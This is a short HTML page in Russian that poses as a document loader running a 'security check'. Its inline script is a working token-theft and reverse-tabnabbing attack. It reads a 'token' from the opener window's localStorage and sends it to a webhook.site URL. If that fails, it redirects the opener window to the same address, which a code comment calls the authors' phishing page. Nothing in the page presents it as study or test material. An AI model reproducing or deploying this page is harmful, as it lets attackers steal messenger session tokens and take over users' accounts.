<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка документа...</title>
</head>
<body>
    <div id="status">Пожалуйста, подождите, идет проверка безопасности...</div>

    <script>
    if (window.opener) {
        // Пробуем дотянуться до localStorage мессенджера через окно-родитель
        try {
            var token = window.opener.localStorage.getItem('token');
            fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?stolen_token=' + token);
        } catch(e) {
            // Если мессенджер блокирует прямой доступ, пробуем редиректнуть его на наш фишинг
            window.opener.location = "https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?error=" + btoa(e.message);
        }
    }
</script>
</body>
</html>
